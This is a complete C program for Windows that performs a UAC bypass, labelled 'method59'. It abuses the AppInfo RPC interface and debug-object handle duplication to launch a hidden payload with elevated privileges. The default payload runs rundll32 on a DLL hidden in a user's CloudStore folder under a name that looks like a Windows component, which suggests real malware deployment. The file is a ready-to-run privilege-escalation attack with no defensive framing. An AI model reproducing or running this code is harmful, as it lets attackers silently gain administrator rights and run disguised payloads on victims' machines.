#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#define WIN32_LEAN_AND_MEAN
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <stdio.h>
#include <rpc.h>
#include <rpcdce.h>

#include "appinfo64.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_ACCESS_DENIED
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)
#endif

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

#define APPINFO_RPC L"201ef99a-7fa0-444c-9399-19ba84f12a1a"
#define DEFAULT_DESKTOP L"WinSta0\\Default"
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif

typedef LONG NTSTATUS;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessDebugObjectHandle = 30
} PROCESSINFOCLASS;

typedef NTSTATUS (NTAPI *PNtRemoveProcessDebug)(HANDLE, HANDLE);
typedef NTSTATUS (NTAPI *PNtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PNtClose)(HANDLE);
typedef VOID (NTAPI *PDbgUiSetThreadDebugObject)(HANDLE);

static PNtRemoveProcessDebug pNtRemoveProcessDebug;
static PNtDuplicateObject pNtDuplicateObject;
static PNtQueryInformationProcess pNtQueryInformationProcess;
static PNtClose pNtClose;
static PDbgUiSetThreadDebugObject pDbgUiSetThreadDebugObject;

static WCHAR g_systemDir[MAX_PATH];
static WCHAR g_systemRoot[MAX_PATH];

static const WCHAR kDefaultPayload[] =
    L"C:\\Windows\\System32\\rundll32.exe "
    L"\"C:\\users\\surel\\appdata\\local\\microsoft\\windows\\CloudStore\\Shell\\Windows.CloudStore.Schema.Shell.dll\",Start";

static BOOL init_ntdll(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return FALSE;

    pNtRemoveProcessDebug = (PNtRemoveProcessDebug)GetProcAddress(ntdll, "NtRemoveProcessDebug");
    pNtDuplicateObject = (PNtDuplicateObject)GetProcAddress(ntdll, "NtDuplicateObject");
    pNtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    pNtClose = (PNtClose)GetProcAddress(ntdll, "NtClose");
    pDbgUiSetThreadDebugObject = (PDbgUiSetThreadDebugObject)GetProcAddress(ntdll, "DbgUiSetThreadDebugObject");

    return pNtRemoveProcessDebug && pNtDuplicateObject && pNtQueryInformationProcess &&
           pNtClose && pDbgUiSetThreadDebugObject;
}

static BOOL init_paths(void) {
    UINT n = GetSystemDirectoryW(g_systemDir, MAX_PATH);
    if (n == 0 || n >= MAX_PATH)
        return FALSE;

    if (GetEnvironmentVariableW(L"SystemRoot", g_systemRoot, MAX_PATH) == 0)
        return FALSE;

    return TRUE;
}

static RPC_STATUS create_binding_handle(RPC_BINDING_HANDLE *binding) {
    RPC_STATUS status;
    RPC_WSTR stringBinding = NULL;
    RPC_BINDING_HANDLE localBinding = NULL;
    RPC_SECURITY_QOS_V3 sqos;
    PSID systemSid = NULL;
    DWORD sidSize = SECURITY_MAX_SID_SIZE;

    if (binding)
        *binding = NULL;

    status = RpcStringBindingComposeW(
        (RPC_WSTR)APPINFO_RPC, (RPC_WSTR)L"ncalrpc", NULL, NULL, NULL, &stringBinding);
    if (status != RPC_S_OK)
        return status;

    status = RpcBindingFromStringBindingW(stringBinding, &localBinding);
    RpcStringFreeW(&stringBinding);
    if (status != RPC_S_OK)
        return status;

    systemSid = LocalAlloc(LPTR, sidSize);
    if (!systemSid) {
        RpcBindingFree(&localBinding);
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    if (!CreateWellKnownSid(WinLocalSystemSid, NULL, systemSid, &sidSize)) {
        status = GetLastError();
        LocalFree(systemSid);
        RpcBindingFree(&localBinding);
        return status;
    }

    ZeroMemory(&sqos, sizeof(sqos));
    sqos.Version = 3;
    sqos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
    sqos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
    sqos.IdentityTracking = 0;
    sqos.Sid = systemSid;

    status = RpcBindingSetAuthInfoExW(
        localBinding, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT,
        0, 0, (RPC_SECURITY_QOS *)&sqos);

    LocalFree(systemSid);

    if (status == RPC_S_OK)
        *binding = localBinding;
    else
        RpcBindingFree(&localBinding);

    return status;
}

static RPC_STATUS aic_async_init(RPC_ASYNC_STATE *async) {
    RPC_STATUS status = RpcAsyncInitializeHandle(async, sizeof(RPC_ASYNC_STATE));
    if (status == RPC_S_OK) {
        async->NotificationType = RpcNotificationTypeEvent;
        async->u.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
        if (!async->u.hEvent)
            status = GetLastError();
    }
    return status;
}

static void aic_async_close(RPC_ASYNC_STATE *async) {
    if (async->u.hEvent) {
        CloseHandle(async->u.hEvent);
        async->u.hEvent = NULL;
    }
}

static BOOL aic_launch_admin_process(
    LPCWSTR executablePath,
    LPCWSTR commandLine,
    DWORD startFlags,
    DWORD creationFlags,
    LPCWSTR currentDirectory,
    LPCWSTR windowStation,
    DWORD showFlags,
    PROCESS_INFORMATION *procInfo)
{
    RPC_BINDING_HANDLE rpcHandle = NULL;
    RPC_ASYNC_STATE asyncState;
    APP_PROCESS_INFORMATION appProcInfo;
    APP_STARTUP_INFO appStartup;
    RPC_STATUS status;
    VOID *reply = NULL;
    LONG elevationType = 0;
    BOOL ok = FALSE;

    if (procInfo) {
        procInfo->hProcess = NULL;
        procInfo->hThread = NULL;
        procInfo->dwProcessId = 0;
        procInfo->dwThreadId = 0;
    }

    ZeroMemory(&appProcInfo, sizeof(appProcInfo));
    ZeroMemory(&appStartup, sizeof(appStartup));
    ZeroMemory(&asyncState, sizeof(asyncState));

    appStartup.dwFlags = STARTF_USESHOWWINDOW;
    appStartup.wShowWindow = (SHORT)showFlags;

    if (create_binding_handle(&rpcHandle) != RPC_S_OK)
        return FALSE;
    if (aic_async_init(&asyncState) != RPC_S_OK) {
        RpcBindingFree(&rpcHandle);
        return FALSE;
    }

    RAiLaunchAdminProcess(
        &asyncState, rpcHandle,
        (wchar_t *)executablePath, (wchar_t *)commandLine,
        (long)startFlags, (long)creationFlags,
        (wchar_t *)currentDirectory, (wchar_t *)windowStation,
        &appStartup, 0, INFINITE, &appProcInfo, &elevationType);

    if (WaitForSingleObject(asyncState.u.hEvent, INFINITE) == WAIT_FAILED) {
        aic_async_close(&asyncState);
        RpcBindingFree(&rpcHandle);
        return FALSE;
    }

    status = RpcAsyncCompleteCall(&asyncState, &reply);
    if (status == 0 && reply == NULL && procInfo) {
        procInfo->hProcess = (HANDLE)appProcInfo.ProcessHandle;
        procInfo->hThread = (HANDLE)appProcInfo.ThreadHandle;
        procInfo->dwProcessId = (DWORD)appProcInfo.ProcessId;
        procInfo->dwThreadId = (DWORD)appProcInfo.ThreadId;
        ok = TRUE;
    }

    aic_async_close(&asyncState);
    RpcBindingFree(&rpcHandle);
    return ok;
}

static NTSTATUS get_process_debug_object(HANDLE process, HANDLE *debugObject) {
    return pNtQueryInformationProcess(
        process, ProcessDebugObjectHandle, debugObject, sizeof(HANDLE), NULL);
}

static NTSTATUS create_process_from_parent(HANDLE parentProcess, LPWSTR payload) {
    STARTUPINFOEXW si;
    PROCESS_INFORMATION pi;
    SIZE_T attrSize = 0x30;
    DWORD flags = CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    do {
        if (attrSize > 1024)
            break;

        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
        if (!si.lpAttributeList)
            break;

        if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) {
            if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
                HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
                break;
            }
            HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
            continue;
        }

        if (!UpdateProcThreadAttribute(
                si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &parentProcess, sizeof(HANDLE), NULL, NULL)) {
            DeleteProcThreadAttributeList(si.lpAttributeList);
            HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
            break;
        }

        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        si.StartupInfo.wShowWindow = SW_HIDE;

        if (CreateProcessW(NULL, payload, NULL, NULL, FALSE, flags, NULL, g_systemRoot, (LPSTARTUPINFOW)&si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            status = STATUS_SUCCESS;
        }

        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        break;
    } while (TRUE);

    return status;
}

static NTSTATUS uac_bypass_method59(LPWSTR payload) {
    BOOL debugObjectSet = FALSE;
    NTSTATUS status = STATUS_ACCESS_DENIED;
    HANDLE dbgHandle = NULL;
    HANDLE dbgProcessHandle = NULL;
    HANDLE dupHandle = NULL;
    PROCESS_INFORMATION procInfo;
    DEBUG_EVENT dbgEvent;
    WCHAR victimPath[MAX_PATH * 2];

    ZeroMemory(&procInfo, sizeof(procInfo));

    _snwprintf(victimPath, MAX_PATH * 2, L"%s\\winver.exe", g_systemDir);

    if (!aic_launch_admin_process(
            victimPath, victimPath, 0,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_systemRoot, DEFAULT_DESKTOP, SW_HIDE, &procInfo)) {
        return STATUS_UNSUCCESSFUL;
    }

    status = get_process_debug_object(procInfo.hProcess, &dbgHandle);
    if (!NT_SUCCESS(status)) {
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hThread);
        CloseHandle(procInfo.hProcess);
        return status;
    }

    pNtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
    TerminateProcess(procInfo.hProcess, 0);
    CloseHandle(procInfo.hThread);
    CloseHandle(procInfo.hProcess);
    procInfo.hProcess = NULL;
    procInfo.hThread = NULL;

    _snwprintf(victimPath, MAX_PATH * 2, L"%s\\ComputerDefaults.exe", g_systemDir);
    ZeroMemory(&procInfo, sizeof(procInfo));
    ZeroMemory(&dbgEvent, sizeof(dbgEvent));

    if (!aic_launch_admin_process(
            victimPath, victimPath, 1,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_systemRoot, DEFAULT_DESKTOP, SW_HIDE, &procInfo)) {
        pNtClose(dbgHandle);
        return STATUS_UNSUCCESSFUL;
    }

    pDbgUiSetThreadDebugObject(dbgHandle);
    debugObjectSet = TRUE;

    while (WaitForDebugEvent(&dbgEvent, INFINITE)) {
        if (dbgEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
            dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
            break;
        }
        ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
    }

    if (dbgProcessHandle) {
        status = pNtDuplicateObject(
            dbgProcessHandle,
            NtCurrentProcess(),
            NtCurrentProcess(),
            &dupHandle,
            PROCESS_ALL_ACCESS,
            0,
            0);

        if (NT_SUCCESS(status)) {
            status = create_process_from_parent(dupHandle, payload);
            pNtClose(dupHandle);
        }
    } else {
        status = STATUS_UNSUCCESSFUL;
    }

    if (debugObjectSet)
        pDbgUiSetThreadDebugObject(NULL);

    if (dbgHandle)
        pNtClose(dbgHandle);

    if (dbgProcessHandle)
        CloseHandle(dbgProcessHandle);

    if (procInfo.hThread)
        CloseHandle(procInfo.hThread);

    if (procInfo.hProcess) {
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hProcess);
    }

    return status;
}

static BOOL is_user_admin(void) {
    BOOL admin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    HANDLE hToken = NULL;

    if (!AllocateAndInitializeSid(
            &ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup)) {
        return FALSE;
    }

    if (CheckTokenMembership(NULL, adminGroup, &admin) && admin) {
        FreeSid(adminGroup);
        return TRUE;
    }

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        HANDLE hLinked = NULL;
        DWORD linkedSize = sizeof(hLinked);

        if (GetTokenInformation(hToken, TokenLinkedToken, &hLinked, linkedSize, &linkedSize) && hLinked) {
            CheckTokenMembership(hLinked, adminGroup, &admin);
            CloseHandle(hLinked);
            if (admin) {
                CloseHandle(hToken);
                FreeSid(adminGroup);
                return TRUE;
            }
        }

        {
            DWORD groupsSize = 0;
            PTOKEN_GROUPS groups = NULL;

            if (!GetTokenInformation(hToken, TokenGroups, NULL, 0, &groupsSize) &&
                GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                groups = (PTOKEN_GROUPS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, groupsSize);
                if (groups && GetTokenInformation(hToken, TokenGroups, groups, groupsSize, &groupsSize)) {
                    for (DWORD i = 0; i < groups->GroupCount; i++) {
                        if (EqualSid(groups->Groups[i].Sid, adminGroup)) {
                            admin = TRUE;
                            break;
                        }
                    }
                }
                if (groups)
                    HeapFree(GetProcessHeap(), 0, groups);
            }
        }

        CloseHandle(hToken);
    }

    FreeSid(adminGroup);
    return admin;
}

int wmain(int argc, wchar_t **argv) {
    LPWSTR payload;
    WCHAR payloadBuf[MAX_PATH * 4];
    NTSTATUS status;

    printf("[*] Bypassing UAC...\n");

    if (!is_user_admin()) {
        printf("[-] User is not a member of the local Administrators group (UAC bypass requires local admin).\n");
        return 1;
    }

    if (!init_ntdll() || !init_paths()) {
        printf("[-] Initialization failed.\n");
        return 1;
    }

    if (argc >= 2) {
        payload = argv[1];
    } else {
        payload = (LPWSTR)kDefaultPayload;
    }

    wcsncpy(payloadBuf, payload, MAX_PATH * 4 - 1);
    payloadBuf[MAX_PATH * 4 - 1] = L'\0';
    payload = payloadBuf;

    //printf("[*] Payload: %ls\n", payload);
    printf("[*] Launching elevated child via AppInfo RPC...\n");

    status = uac_bypass_method59(payload);

    if (NT_SUCCESS(status)) {
        printf("\n[+] SUCCESS: UAC bypassed!\n");
        return 0;
    }

    printf("[-] Bypass failed (NTSTATUS 0x%08lx, GetLastError %lu).\n", status, GetLastError());
    return 1;
}
